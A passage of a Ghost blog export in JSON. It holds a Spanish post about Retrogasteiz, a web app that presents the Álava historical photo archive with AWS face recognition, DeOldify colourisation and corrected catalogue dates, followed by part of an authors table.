experimentar lentitud en la carga y navegación de las imágenes. Este problema surge del procesamiento intensivo que se realiza en el navegador, especialmente cuando se interactúa con múltiples imágenes o se aplica el coloreado de inteligencia artificial.\"]]],[1,\"p\",[[0,[],0,\"Si bien este es un aspecto que se reconoce como una área de mejora, también representa una oportunidad emocionante para el futuro de Retrogasteiz. Entre las posibles soluciones y estrategias que podrían ser implementadas, se encuentran:\"]]],[3,\"ul\",[[[0,[8],1,\"Optimización de Carga de Datos:\"],[0,[],0,\" Implementar técnicas de paginación y carga diferida podría aliviar la presión sobre el navegador, permitiendo una experiencia más rápida y sin inconvenientes.\"]],[[0,[8],1,\"Uso de Tecnologías de Compresión:\"],[0,[],0,\" La exploración de formatos de compresión más eficientes y métodos de entrega podría mejorar significativamente la velocidad de carga y la eficiencia en la manipulación de datos.\"]],[[0,[8],1,\"Procesamiento en el Servidor:\"],[0,[],0,\" Considerar el procesamiento en el servidor para algunas tareas pesadas podría equilibrar la carga entre el navegador y el servidor, ofreciendo una experiencia más ágil.\"]]]],[1,\"h1\",[[0,[],0,\"Agradecimientos:\"]]],[1,\"p\",[[0,[],0,\"En la culminación de un proyecto tan fascinante y ambicioso como Retrogasteiz, es esencial reconocer y agradecer a aquellos que han hecho posible esta jornada.\"]]],[1,\"p\",[[0,[],0,\"En primer lugar, me gustaría expresar mi más profundo agradecimiento a la \"],[0,[8],1,\"Diputación Foral de Álava\"],[0,[],0,\". Su dedicación en la preservación y digitalización del archivo histórico de Álava ha sido fundamental para proporcionar los recursos y el contexto necesarios para este proyecto. Su compromiso con la cultura, la historia, y la apertura en el acceso a estos tesoros ha sido una fuente constante de inspiración.\"]]],[1,\"p\",[[0,[],0,\"En segundo lugar, no puedo dejar de mencionar a \"],[0,[8],1,\"Jaime Gómez-Obregón\"],[0,[],0,\", cuyo trabajo en este ámbito ha sido un catalizador para mi propio viaje en la exploración de la fotografía histórica. Su enfoque innovador y su pasión por conectar el pasado con el presente mediante la tecnología me ha inspirado no solo a emprender este proyecto, sino también a buscar nuevas formas de enriquecer y compartir nuestro patrimonio común.\"]]],[1,\"p\",[[0,[],0,\"Este proyecto es un testamento de lo que se puede lograr cuando la innovación, la pasión y la colaboración se unen. Es un recordatorio de que las imágenes del pasado tienen mucho que enseñarnos y que la tecnología puede ser un puente hacia nuevas comprensiones y conexiones.\"]]],[1,\"p\",[[0,[],0,\"A todos aquellos que han contribuido, directa o indirectamente, a este proyecto, mi sincero agradecimiento. Vuestro apoyo y inspiración han sido fundamentales para hacer de Retrogasteiz una realidad vibrante y enriquecedora.\"]]]],\"ghostVersion\":\"4.0\"}",
            "lexical": null,
            "html": "<p><a href=\"https://retrogasteiz.com\">Retrogasteiz.com</a> ha sido un experimento personal inspirado por las obras originales de <a href=\"https://jaime.gomezobregon.com/\">Jaime Gómez-Obregón</a> en <a href=\"https://retrosantander.com/\">Retrosantander </a>y <a href=\"https://retrogipuzkoa.com/\">Retrogipuzkoa</a>. Actualmente tiene más de 100.000 imágenes del Archivo de Álava aunque solo están publicadas aquellas imágenes que se han podido catalogar entre los años 1818 y 1990. Estas imágenes han sido digitalizadas por la <a href=\"https://photo.araba.eus/s/photoaraba\">Diputación Foral de Álava - Araba Foru Aldundia</a> y se han publicado bajo la licencia abierta <a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.es\">CC BY-NC-SA 4.0</a> en <a href=\"https://photo.araba.eus\">https://photo.araba.eus</a> por la misma entidad.</p><div class=\"kg-card kg-callout-card kg-callout-card-grey\"><div class=\"kg-callout-emoji\">💡</div><div class=\"kg-callout-text\">El objetivo de este proyecto es investigar nuevas maneras de realzar un archivo fotográfico público, mediante la implementación de conceptos innovadores como la visión artificial y las interfaces de usuario modernas.</div></div><p>Además, Retrogasteiz sirve como un ejemplo palpable de cómo la disponibilidad abierta de bases de datos públicas brinda a la gente la oportunidad de desarrollar y compartir iniciativas frescas y colaborativas buscando la mejora continua de los resultados disponibles.</p><h1 id=\"descripci%C3%B3n-del-archivo-hist%C3%B3rico-de-%C3%A1lava\">Descripción del Archivo Histórico de Álava</h1><p>Iniciado por el Archivo de Álava, PHOTO-ARABA sirve como el vehículo principal para compartir el patrimonio fotográfico de la Diputación Foral de Álava con el público.</p><p>Este proyecto cultural, en constante expansión, ya cuenta con una colección impresionante de más de cien mil imágenes históricas.</p><p>Lo que PHOTO-ARABA ofrece es una ventana única a la evolución de nuestro territorio en los aspectos políticos, sociales y económicos. Captura los cambios en el paisaje y en las áreas urbanas, y documenta las transformaciones en el estilo de vida y en las tradiciones alavesas a lo largo del último siglo. Además de las imágenes situadas en Álava, la colección también incluye fotografías de viajes y de eventos importantes ocurridos en otros lugares.</p><h1 id=\"qu%C3%A9-es-retrogasteiz\">Qué es Retrogasteiz</h1><p><a href=\"https://retrogasteiz.com/\">Retrogasteiz</a> es una aplicación web innovadora que busca llevar el patrimonio fotográfico de Álava a nuevos horizontes donde la antigua Vitoria es la protagonista. Mientras que PHOTO-ARABA sirve como el portal oficial para la difusión del archivo histórico, ofreciendo acceso a más de cien mil fotografías documentadas, Retrogasteiz va un paso más allá en la exploración y visualización de este valioso recurso.</p><h2 id=\"diferencias-clave-entre-photo-araba-y-retrogasteiz\">Diferencias clave entre PHOTO-ARABA y Retrogasteiz</h2><ul><li><strong>Tecnología Avanzada:</strong> Retrogasteiz emplea tecnologías de inteligencia artificial, como el reconocimiento facial a través de Amazon AWS y la coloración de imágenes en blanco y negro utilizando DeOldify. Esto permite a los usuarios interactuar con las imágenes de una manera más viva y dinámica.</li><li><strong>Visualización Mejorada:</strong> Mientras PHOTO-ARABA se centra en la presentación y documentación de las imágenes, Retrogasteiz ofrece una experiencia de visualización optimizada, con la conversión de imágenes a formato <strong>webp</strong>, reduciendo así el peso de las imágenes en un 70% con respecto al formato <strong>jpg</strong>. Esto facilita una carga más rápida y eficiente.</li></ul><figure class=\"kg-card kg-image-card kg-card-hascaption\"><img src=\"__GHOST_URL__/content/images/2023/08/plot.png\" class=\"kg-image\" alt loading=\"lazy\" width=\"1000\" height=\"600\" srcset=\"__GHOST_URL__/content/images/size/w600/2023/08/plot.png 600w, __GHOST_URL__/content/images/2023/08/plot.png 1000w\" sizes=\"(min-width: 720px) 720px\"><figcaption>Reducción tamaño total de almacenamiento de todas las imágenes</figcaption></figure><ul><li><strong>Corrección y Filtrado de Datos:</strong> Retrogasteiz ha implementado mejoras en la precisión de los datos, corrigiendo fechas incorrectas y permitiendo futuras consultas con filtrado de fechas. Esto contrasta con el enfoque más estático de PHOTO-ARABA.</li><li><strong>Experiencia de Usuario Moderna:</strong> Con interfaces de usuario contemporáneas, Retrogasteiz brinda una experiencia de navegación más intuitiva y atractiva, permitiendo a los usuarios explorar el archivo histórico de una manera más interactiva y personalizada.</li></ul><p>En resumen, mientras PHOTO-ARABA proporciona un acceso esencial y directo al archivo histórico de Álava, Retrogasteiz amplía este acceso, ofreciendo nuevas formas de interactuar y disfrutar del patrimonio fotográfico a través de tecnologías y enfoques modernos. Retrogasteiz representa no solo una extensión de PHOTO-ARABA sino una evolución, celebrando el pasado mientras abraza el futuro de la visualización digital.</p><h1 id=\"integraci%C3%B3n-de-inteligencia-artificial\">Integración de Inteligencia Artificial</h1><p>La incorporación de tecnologías de Inteligencia Artificial (IA) ha sido un elemento clave en la innovación que <a href=\"https://retrogasteiz.com/\">Retrogasteiz </a>aporta al archivo histórico de Álava. Este proceso ha implicado el uso de diferentes herramientas y técnicas, detalladas a continuación:</p><ul><li><strong>Reconocimiento Facial con AWS:</strong> Para potenciar la capacidad de identificación y búsqueda dentro de una muestra de 10.000 imágenes, se ha recurrido a la plataforma <a href=\"https://aws.amazon.com/es/rekognition/\">Amazon Web Services</a> (AWS) para el reconocimiento facial. La implementación de esta tecnología de reconocimiento facial ha sido posible a través de una suscripción a AWS, con un costo aproximado de 50€. Al tratarse de un servicio de pago por uso, esta inversión ha permitido analizar y procesar la muestra seleccionada, agregando una dimensión de búsqueda y análisis única al archivo.</li></ul><figure class=\"kg-card kg-image-card kg-card-hascaption\"><img src=\"__GHOST_URL__/content/images/2023/08/image.png\" class=\"kg-image\" alt loading=\"lazy\" width=\"1009\" height=\"646\" srcset=\"__GHOST_URL__/content/images/size/w600/2023/08/image.png 600w, __GHOST_URL__/content/images/size/w1000/2023/08/image.png 1000w, __GHOST_URL__/content/images/2023/08/image.png 1009w\" sizes=\"(min-width: 720px) 720px\"><figcaption>Reconocimiento facial peluquería de señoras Urrutia</figcaption></figure><ul><li><strong>Coloreado con Deoldify:</strong> A través del uso del modelo de deep learning de <a href=\"https://deoldify.ai/\">Deoldify</a>, se ha llevado a cabo un proceso de coloreado para las imágenes en blanco y negro. A diferencia del reconocimiento facial, esta etapa del proyecto se ha realizado en local, sin incurrir en costos adicionales. La integración de Deoldify ha añadido vida y color a las imágenes históricas, permitiendo a los usuarios experimentar las fotos en una forma más cercana a cómo habrían aparecido en la realidad en su momento.</li></ul><figure class=\"kg-card kg-image-card kg-card-hascaption\"><img src=\"__GHOST_URL__/content/images/2023/08/image-1.png\" class=\"kg-image\" alt loading=\"lazy\" width=\"1016\" height=\"668\" srcset=\"__GHOST_URL__/content/images/size/w600/2023/08/image-1.png 600w, __GHOST_URL__/content/images/size/w1000/2023/08/image-1.png 1000w, __GHOST_URL__/content/images/2023/08/image-1.png 1016w\" sizes=\"(min-width: 720px) 720px\"><figcaption>Coloreado de la casa/peluquería de señoras Urrutia</figcaption></figure><p>La combinación de estas tecnologías de IA ha enriquecido Retrogasteiz, no solo mejorando la visualización y experiencia del usuario sino también abriendo nuevas posibilidades para la investigación y el estudio del patrimonio fotográfico de Álava. El equilibrio entre las soluciones de pago y las implementaciones locales refleja una estrategia cuidadosa y eficiente para maximizar el valor y el impacto de la integración de la Inteligencia Artificial en el proyecto.</p><h1 id=\"curiosidades-y-desaf%C3%ADos\">Curiosidades y Desafíos</h1><p>Dentro del vasto archivo fotográfico de Álava, se han encontrado algunos datos curiosos y desafíos inesperados. Un aspecto notable fue la presencia de fechas incorrectas en algunas imágenes, como el <a href=\"https://photo.araba.eus/s/photoaraba/item/162447\">29 de febrero de 1953</a> o el <a href=\"https://photo.araba.eus/s/photoaraba/item/162796\">31 de junio de 1953</a>, fechas que simplemente no existen en el calendario.</p><p>Este hallazgo planteó la necesidad de un proceso de corrección meticuloso. Las fechas erróneas se parsearon y corrigieron, permitiendo no solo una mayor precisión en la documentación sino también la posibilidad de futuras consultas y aplicaciones de filtros. Este trabajo, aunque esencial, denota un proceso manual en la catalogación de las imágenes que dejó margen para errores.</p><p>Es un punto de reflexión interesante en la era de la digitalización, en la que los políticos y gobiernos a menudo promocionan los avances tecnológicos y la transformación digital. A pesar de este enfoque en la modernización, aún se pueden encontrar estos pequeños errores manuales en procesos que involucran patrimonio tan valioso.</p><div class=\"kg-card kg-callout-card kg-callout-card-grey\"><div class=\"kg-callout-emoji\">💡</div><div class=\"kg-callout-text\">El propósito de resaltar estos desafíos no es criticar a quienes han trabajado arduamente en la catalogación de estos archivos. Más bien, es un llamado de atención a las instituciones que promueven la digitalización pero no proporcionan los recursos necesarios y eficientes para asegurar que el trabajo se realice con el cuidado y la precisión que merece.</div></div><p>Este incidente no disminuye la importancia del archivo, pero sí subraya la importancia de una transición cuidadosa hacia la digitalización. La corrección de estos errores en <a href=\"https://retrogasteiz.com\">Retrogasteiz </a>demuestra una atención al detalle y un compromiso con la precisión y calidad, asegurando que las imágenes históricas sean un reflejo fiel y accesible del pasado de Álava.</p><h1 id=\"resultados-y-aplicaciones\">Resultados y Aplicaciones </h1><p>La plataforma <a href=\"https://retrogasteiz.com/\">Retrogasteiz </a>lleva la exploración del archivo fotográfico de Álava a un nuevo nivel, ofreciendo funcionalidades únicas que enriquecen la experiencia del usuario. Estas innovaciones se destacan a continuación:</p><ul><li><strong>Búsqueda Simplificada:</strong> A través de la web, los usuarios pueden realizar búsquedas teniendo en cuenta diversos parámetros como el título, descripción, y fechas. Se ha diseñado un sistema de búsqueda intuitivo y eficiente que evita al usuario tener que lidiar con filtros o formularios innecesarios y repetir búsquedas. Esta optimización en el proceso de búsqueda permite una exploración más ágil y satisfactoria del archivo.</li></ul><figure class=\"kg-card kg-image-card kg-card-hascaption\"><img src=\"__GHOST_URL__/content/images/2023/08/image-2.png\" class=\"kg-image\" alt loading=\"lazy\" width=\"390\" height=\"245\"><figcaption>Buscador simplificado con sugerencias</figcaption></figure><ul><li><strong>Reconocimiento Facial:</strong> La integración de tecnologías de IA para el reconocimiento facial no solo permite visualizar las caras reconocidas en las imágenes, sino que también abre la puerta a futuras funcionalidades, como la posibilidad de realizar búsquedas por rostros. Esta característica agrega una dimensión adicional a la forma en que se pueden explorar y entender las imágenes históricas.</li></ul><figure class=\"kg-card kg-image-card kg-card-hascaption\"><img src=\"__GHOST_URL__/content/images/2023/08/image-3.png\" class=\"kg-image\" alt loading=\"lazy\" width=\"310\" height=\"119\"><figcaption>Personas detectadas en la imágen</figcaption></figure><ul><li><strong>Coloreado y Comparación de Imágenes:</strong> Retrogasteiz ofrece la posibilidad de colorear imágenes en blanco y negro y descargar una comparación entre las versiones en color y en blanco y negro. Esta función transforma la forma en que los usuarios interactúan con las imágenes, permitiendo una apreciación más profunda y viva de los detalles y la historia que capturan.</li></ul><figure class=\"kg-card kg-image-card kg-card-hascaption\"><img src=\"__GHOST_URL__/content/images/2023/08/2d6ad75b46a729e589f9225e838a7d4635ed71f5.jpg\" class=\"kg-image\" alt loading=\"lazy\" width=\"2000\" height=\"1467\" srcset=\"__GHOST_URL__/content/images/size/w600/2023/08/2d6ad75b46a729e589f9225e838a7d4635ed71f5.jpg 600w, __GHOST_URL__/content/images/size/w1000/2023/08/2d6ad75b46a729e589f9225e838a7d4635ed71f5.jpg 1000w, __GHOST_URL__/content/images/size/w1600/2023/08/2d6ad75b46a729e589f9225e838a7d4635ed71f5.jpg 1600w, __GHOST_URL__/content/images/size/w2400/2023/08/2d6ad75b46a729e589f9225e838a7d4635ed71f5.jpg 2400w\" sizes=\"(min-width: 720px) 720px\"><figcaption>Retratos de boda de los recién casados Martín Ona y Pilar Arregui</figcaption></figure><p>Estas aplicaciones y resultados reflejan el compromiso de Retrogasteiz con la innovación y la mejora continua en la presentación del patrimonio fotográfico de Álava. La plataforma no solo proporciona una ventana al pasado, sino que también emplea la tecnología moderna para facilitar una exploración más rica y atractiva, haciendo que la historia cobre vida de formas antes inimaginables.</p><p>Compartir algunos de los resultados alcanzados.<br>Posibles aplicaciones y cómo podría beneficiar a historiadores, investigadores, y al público en general.</p><h1 id=\"desaf%C3%ADos-y-oportunidades\">Desafíos y Oportunidades</h1><p>Una de las características distintivas de <a href=\"https://retrogasteiz.com/\">Retrogasteiz </a>es que la web se ejecuta íntegramente en el navegador del usuario. Aunque esto ofrece una experiencia de usuario fluida y sin dependencias externas, también ha presentado ciertos desafíos.</p><p>Con grandes cantidades de datos, algunos usuarios pueden experimentar lentitud en la carga y navegación de las imágenes. Este problema surge del procesamiento intensivo que se realiza en el navegador, especialmente cuando se interactúa con múltiples imágenes o se aplica el coloreado de inteligencia artificial.</p><p>Si bien este es un aspecto que se reconoce como una área de mejora, también representa una oportunidad emocionante para el futuro de Retrogasteiz. Entre las posibles soluciones y estrategias que podrían ser implementadas, se encuentran:</p><ul><li><strong>Optimización de Carga de Datos:</strong> Implementar técnicas de paginación y carga diferida podría aliviar la presión sobre el navegador, permitiendo una experiencia más rápida y sin inconvenientes.</li><li><strong>Uso de Tecnologías de Compresión:</strong> La exploración de formatos de compresión más eficientes y métodos de entrega podría mejorar significativamente la velocidad de carga y la eficiencia en la manipulación de datos.</li><li><strong>Procesamiento en el Servidor:</strong> Considerar el procesamiento en el servidor para algunas tareas pesadas podría equilibrar la carga entre el navegador y el servidor, ofreciendo una experiencia más ágil.</li></ul><h1 id=\"agradecimientos\">Agradecimientos:</h1><p>En la culminación de un proyecto tan fascinante y ambicioso como Retrogasteiz, es esencial reconocer y agradecer a aquellos que han hecho posible esta jornada.</p><p>En primer lugar, me gustaría expresar mi más profundo agradecimiento a la <strong>Diputación Foral de Álava</strong>. Su dedicación en la preservación y digitalización del archivo histórico de Álava ha sido fundamental para proporcionar los recursos y el contexto necesarios para este proyecto. Su compromiso con la cultura, la historia, y la apertura en el acceso a estos tesoros ha sido una fuente constante de inspiración.</p><p>En segundo lugar, no puedo dejar de mencionar a <strong>Jaime Gómez-Obregón</strong>, cuyo trabajo en este ámbito ha sido un catalizador para mi propio viaje en la exploración de la fotografía histórica. Su enfoque innovador y su pasión por conectar el pasado con el presente mediante la tecnología me ha inspirado no solo a emprender este proyecto, sino también a buscar nuevas formas de enriquecer y compartir nuestro patrimonio común.</p><p>Este proyecto es un testamento de lo que se puede lograr cuando la innovación, la pasión y la colaboración se unen. Es un recordatorio de que las imágenes del pasado tienen mucho que enseñarnos y que la tecnología puede ser un puente hacia nuevas comprensiones y conexiones.</p><p>A todos aquellos que han contribuido, directa o indirectamente, a este proyecto, mi sincero agradecimiento. Vuestro apoyo y inspiración han sido fundamentales para hacer de Retrogasteiz una realidad vibrante y enriquecedora.</p>",
            "comment_id": "64cb76e03a1966005b7371ba",
            "plaintext": "Retrogasteiz.com ha sido un experimento personal inspirado por las obras originales de Jaime Gómez-Obregón en Retrosantander y Retrogipuzkoa. Actualmente tiene más de 100.000 imágenes del Archivo de Álava aunque solo están publicadas aquellas imágenes que se han podido catalogar entre los años 1818 y 1990. Estas imágenes han sido digitalizadas por la Diputación Foral de Álava - Araba Foru Aldundia y se han publicado bajo la licencia abierta CC BY-NC-SA 4.0 en https://photo.araba.eus por la misma entidad.\n\n💡El objetivo de este proyecto es investigar nuevas maneras de realzar un archivo fotográfico público, mediante la implementación de conceptos innovadores como la visión artificial y las interfaces de usuario modernas.\n\nAdemás, Retrogasteiz sirve como un ejemplo palpable de cómo la disponibilidad abierta de bases de datos públicas brinda a la gente la oportunidad de desarrollar y compartir iniciativas frescas y colaborativas buscando la mejora continua de los resultados disponibles.\n\n\nDescripción del Archivo Histórico de Álava\n\nIniciado por el Archivo de Álava, PHOTO-ARABA sirve como el vehículo principal para compartir el patrimonio fotográfico de la Diputación Foral de Álava con el público.\n\nEste proyecto cultural, en constante expansión, ya cuenta con una colección impresionante de más de cien mil imágenes históricas.\n\nLo que PHOTO-ARABA ofrece es una ventana única a la evolución de nuestro territorio en los aspectos políticos, sociales y económicos. Captura los cambios en el paisaje y en las áreas urbanas, y documenta las transformaciones en el estilo de vida y en las tradiciones alavesas a lo largo del último siglo. Además de las imágenes situadas en Álava, la colección también incluye fotografías de viajes y de eventos importantes ocurridos en otros lugares.\n\n\nQué es Retrogasteiz\n\nRetrogasteiz es una aplicación web innovadora que busca llevar el patrimonio fotográfico de Álava a nuevos horizontes donde la antigua Vitoria es la protagonista. Mientras que PHOTO-ARABA sirve como el portal oficial para la difusión del archivo histórico, ofreciendo acceso a más de cien mil fotografías documentadas, Retrogasteiz va un paso más allá en la exploración y visualización de este valioso recurso.\n\n\nDiferencias clave entre PHOTO-ARABA y Retrogasteiz\n\n * Tecnología Avanzada: Retrogasteiz emplea tecnologías de inteligencia artificial, como el reconocimiento facial a través de Amazon AWS y la coloración de imágenes en blanco y negro utilizando DeOldify. Esto permite a los usuarios interactuar con las imágenes de una manera más viva y dinámica.\n * Visualización Mejorada: Mientras PHOTO-ARABA se centra en la presentación y documentación de las imágenes, Retrogasteiz ofrece una experiencia de visualización optimizada, con la conversión de imágenes a formato webp, reduciendo así el peso de las imágenes en un 70% con respecto al formato jpg. Esto facilita una carga más rápida y eficiente.\n\n * Corrección y Filtrado de Datos: Retrogasteiz ha implementado mejoras en la precisión de los datos, corrigiendo fechas incorrectas y permitiendo futuras consultas con filtrado de fechas. Esto contrasta con el enfoque más estático de PHOTO-ARABA.\n * Experiencia de Usuario Moderna: Con interfaces de usuario contemporáneas, Retrogasteiz brinda una experiencia de navegación más intuitiva y atractiva, permitiendo a los usuarios explorar el archivo histórico de una manera más interactiva y personalizada.\n\nEn resumen, mientras PHOTO-ARABA proporciona un acceso esencial y directo al archivo histórico de Álava, Retrogasteiz amplía este acceso, ofreciendo nuevas formas de interactuar y disfrutar del patrimonio fotográfico a través de tecnologías y enfoques modernos. Retrogasteiz representa no solo una extensión de PHOTO-ARABA sino una evolución, celebrando el pasado mientras abraza el futuro de la visualización digital.\n\n\nIntegración de Inteligencia Artificial\n\nLa incorporación de tecnologías de Inteligencia Artificial (IA) ha sido un elemento clave en la innovación que Retrogasteiz aporta al archivo histórico de Álava. Este proceso ha implicado el uso de diferentes herramientas y técnicas, detalladas a continuación:\n\n * Reconocimiento Facial con AWS: Para potenciar la capacidad de identificación y búsqueda dentro de una muestra de 10.000 imágenes, se ha recurrido a la plataforma Amazon Web Services (AWS) para el reconocimiento facial. La implementación de esta tecnología de reconocimiento facial ha sido posible a través de una suscripción a AWS, con un costo aproximado de 50€. Al tratarse de un servicio de pago por uso, esta inversión ha permitido analizar y procesar la muestra seleccionada, agregando una dimensión de búsqueda y análisis única al archivo.\n\n * Coloreado con Deoldify: A través del uso del modelo de deep learning de Deoldify, se ha llevado a cabo un proceso de coloreado para las imágenes en blanco y negro. A diferencia del reconocimiento facial, esta etapa del proyecto se ha realizado en local, sin incurrir en costos adicionales. La integración de Deoldify ha añadido vida y color a las imágenes históricas, permitiendo a los usuarios experimentar las fotos en una forma más cercana a cómo habrían aparecido en la realidad en su momento.\n\nLa combinación de estas tecnologías de IA ha enriquecido Retrogasteiz, no solo mejorando la visualización y experiencia del usuario sino también abriendo nuevas posibilidades para la investigación y el estudio del patrimonio fotográfico de Álava. El equilibrio entre las soluciones de pago y las implementaciones locales refleja una estrategia cuidadosa y eficiente para maximizar el valor y el impacto de la integración de la Inteligencia Artificial en el proyecto.\n\n\nCuriosidades y Desafíos\n\nDentro del vasto archivo fotográfico de Álava, se han encontrado algunos datos curiosos y desafíos inesperados. Un aspecto notable fue la presencia de fechas incorrectas en algunas imágenes, como el 29 de febrero de 1953 o el 31 de junio de 1953, fechas que simplemente no existen en el calendario.\n\nEste hallazgo planteó la necesidad de un proceso de corrección meticuloso. Las fechas erróneas se parsearon y corrigieron, permitiendo no solo una mayor precisión en la documentación sino también la posibilidad de futuras consultas y aplicaciones de filtros. Este trabajo, aunque esencial, denota un proceso manual en la catalogación de las imágenes que dejó margen para errores.\n\nEs un punto de reflexión interesante en la era de la digitalización, en la que los políticos y gobiernos a menudo promocionan los avances tecnológicos y la transformación digital. A pesar de este enfoque en la modernización, aún se pueden encontrar estos pequeños errores manuales en procesos que involucran patrimonio tan valioso.\n\n💡El propósito de resaltar estos desafíos no es criticar a quienes han trabajado arduamente en la catalogación de estos archivos. Más bien, es un llamado de atención a las instituciones que promueven la digitalización pero no proporcionan los recursos necesarios y eficientes para asegurar que el trabajo se realice con el cuidado y la precisión que merece.\n\nEste incidente no disminuye la importancia del archivo, pero sí subraya la importancia de una transición cuidadosa hacia la digitalización. La corrección de estos errores en Retrogasteiz demuestra una atención al detalle y un compromiso con la precisión y calidad, asegurando que las imágenes históricas sean un reflejo fiel y accesible del pasado de Álava.\n\n\nResultados y Aplicaciones\n\nLa plataforma Retrogasteiz lleva la exploración del archivo fotográfico de Álava a un nuevo nivel, ofreciendo funcionalidades únicas que enriquecen la experiencia del usuario. Estas innovaciones se destacan a continuación:\n\n * Búsqueda Simplificada: A través de la web, los usuarios pueden realizar búsquedas teniendo en cuenta diversos parámetros como el título, descripción, y fechas. Se ha diseñado un sistema de búsqueda intuitivo y eficiente que evita al usuario tener que lidiar con filtros o formularios innecesarios y repetir búsquedas. Esta optimización en el proceso de búsqueda permite una exploración más ágil y satisfactoria del archivo.\n\n * Reconocimiento Facial: La integración de tecnologías de IA para el reconocimiento facial no solo permite visualizar las caras reconocidas en las imágenes, sino que también abre la puerta a futuras funcionalidades, como la posibilidad de realizar búsquedas por rostros. Esta característica agrega una dimensión adicional a la forma en que se pueden explorar y entender las imágenes históricas.\n\n * Coloreado y Comparación de Imágenes: Retrogasteiz ofrece la posibilidad de colorear imágenes en blanco y negro y descargar una comparación entre las versiones en color y en blanco y negro. Esta función transforma la forma en que los usuarios interactúan con las imágenes, permitiendo una apreciación más profunda y viva de los detalles y la historia que capturan.\n\nEstas aplicaciones y resultados reflejan el compromiso de Retrogasteiz con la innovación y la mejora continua en la presentación del patrimonio fotográfico de Álava. La plataforma no solo proporciona una ventana al pasado, sino que también emplea la tecnología moderna para facilitar una exploración más rica y atractiva, haciendo que la historia cobre vida de formas antes inimaginables.\n\nCompartir algunos de los resultados alcanzados.\nPosibles aplicaciones y cómo podría beneficiar a historiadores, investigadores, y al público en general.\n\n\nDesafíos y Oportunidades\n\nUna de las características distintivas de Retrogasteiz es que la web se ejecuta íntegramente en el navegador del usuario. Aunque esto ofrece una experiencia de usuario fluida y sin dependencias externas, también ha presentado ciertos desafíos.\n\nCon grandes cantidades de datos, algunos usuarios pueden experimentar lentitud en la carga y navegación de las imágenes. Este problema surge del procesamiento intensivo que se realiza en el navegador, especialmente cuando se interactúa con múltiples imágenes o se aplica el coloreado de inteligencia artificial.\n\nSi bien este es un aspecto que se reconoce como una área de mejora, también representa una oportunidad emocionante para el futuro de Retrogasteiz. Entre las posibles soluciones y estrategias que podrían ser implementadas, se encuentran:\n\n * Optimización de Carga de Datos: Implementar técnicas de paginación y carga diferida podría aliviar la presión sobre el navegador, permitiendo una experiencia más rápida y sin inconvenientes.\n * Uso de Tecnologías de Compresión: La exploración de formatos de compresión más eficientes y métodos de entrega podría mejorar significativamente la velocidad de carga y la eficiencia en la manipulación de datos.\n * Procesamiento en el Servidor: Considerar el procesamiento en el servidor para algunas tareas pesadas podría equilibrar la carga entre el navegador y el servidor, ofreciendo una experiencia más ágil.\n\n\nAgradecimientos:\n\nEn la culminación de un proyecto tan fascinante y ambicioso como Retrogasteiz, es esencial reconocer y agradecer a aquellos que han hecho posible esta jornada.\n\nEn primer lugar, me gustaría expresar mi más profundo agradecimiento a la Diputación Foral de Álava. Su dedicación en la preservación y digitalización del archivo histórico de Álava ha sido fundamental para proporcionar los recursos y el contexto necesarios para este proyecto. Su compromiso con la cultura, la historia, y la apertura en el acceso a estos tesoros ha sido una fuente constante de inspiración.\n\nEn segundo lugar, no puedo dejar de mencionar a Jaime Gómez-Obregón, cuyo trabajo en este ámbito ha sido un catalizador para mi propio viaje en la exploración de la fotografía histórica. Su enfoque innovador y su pasión por conectar el pasado con el presente mediante la tecnología me ha inspirado no solo a emprender este proyecto, sino también a buscar nuevas formas de enriquecer y compartir nuestro patrimonio común.\n\nEste proyecto es un testamento de lo que se puede lograr cuando la innovación, la pasión y la colaboración se unen. Es un recordatorio de que las imágenes del pasado tienen mucho que enseñarnos y que la tecnología puede ser un puente hacia nuevas comprensiones y conexiones.\n\nA todos aquellos que han contribuido, directa o indirectamente, a este proyecto, mi sincero agradecimiento. Vuestro apoyo y inspiración han sido fundamentales para hacer de Retrogasteiz una realidad vibrante y enriquecedora.",
            "feature_image": "__GHOST_URL__/content/images/2023/08/poster.png",
            "featured": 0,
            "type": "post",
            "status": "published",
            "locale": null,
            "visibility": "public",
            "email_recipient_filter": "all",
            "created_at": "2023-08-03T09:44:00.000Z",
            "updated_at": "2023-08-03T13:05:54.000Z",
            "published_at": "2023-08-03T13:05:54.000Z",
            "custom_excerpt": null,
            "codeinjection_head": null,
            "codeinjection_foot": null,
            "custom_template": null,
            "canonical_url": null,
            "newsletter_id": null
          }
        ],
        "posts_authors": [
          {
            "id": "63a2235cb4a78600c3cb607a",
            "post_id": "63a2235cb4a78600c3cb6079",
            "author_id": "1",
            "sort_order": 0
          },
          {
            "id": "63a223c10057530148112386",
            "post_id": "63a223c10057530148112373",
            "author_id": "63a223c0005753014811234d",
            "sort_order": 0
          },
          {
            "id": "63a223c1005753014811238c",
            "post_id": "63a223c10057530148112374",
            "author_id": "63a223c0005753014811234d",
            "sort_order": 0
          },
          {
            "id": "63a223c1005753014811238e",
            "post_id": "63a223c10057530148112375",
            "author_id": "63a223c0005753014811234d",
            "sort_order": 0
          },
          {
            "id": "63a223c20057530148112394",
            "post_id": "63a223c10057530148112376",
            "author_id": "63a223c0005753014811234d",
            "sort_order": 0
          },
          {
            "id": "63a223c20057530148112396",
            "post_id": "63a223c10057530148112377",
            "author_id": "63a223c0005753014811234d",
            "sort_order": 0
          },
          {
            "id": "63a223c2005753014811239c",
            "post_id": "63a223c10057530148112378",
            "author_id": "63a223c0005753014811234d",
            "sort_order": 0
          },
          {
            "id": "63a223c200575301481123a2",
            "post_id": "63a223c10057530148112379",
            "author_id": "63a223c0005753014811234d",
            "sort_order": 0
          },
          {
            "id": "63a223c200575301481123a9",
            "post_id": "63a223c1005753014811237a",
            "author_id": "63a223c0005753014811234d",
            "sort_order": 0
          },
          {
            "id": "63a223c200575301481123af",
            "post_id": "63a223c1005753014811237b",
            "author_id": "63a223c0005753014811234d",
            "sort_order": 0
          },
          {
            "id": "63a223c200575301481123b4",
            "post_id": "63a223c1005753014811237c",
            "author_id": "63a223c0005753014811234d",
            "sort_order": 0
          },
          {
            "id": "63a223c200575301481123b9",
            "post_id": "63a223c1005753014811237d",
            "author_id": "63a223c0005753014811234d",
            "sort_order": 0
          },
          {
            "id": "63a223c200575301481123be",
            "post_id": "63a223c1005753014811237e",
            "author_id": "63a223c0005753014811234d",
            "sort_order": 0
          },
          {
            "id": "63a223c200575301481123c6",
            "post_id": "63a223c1005753014811237f",
            "author_id": "63a223c0005753014811234d",
            "sort_order": 0
          },
          {
            "id": "63a223c200575301481123c9",
            "post_id": "63a223c10057530148112380",
            "author_id": "63a223c0005753014811234d",
            "sort_order": 0
          },
          {
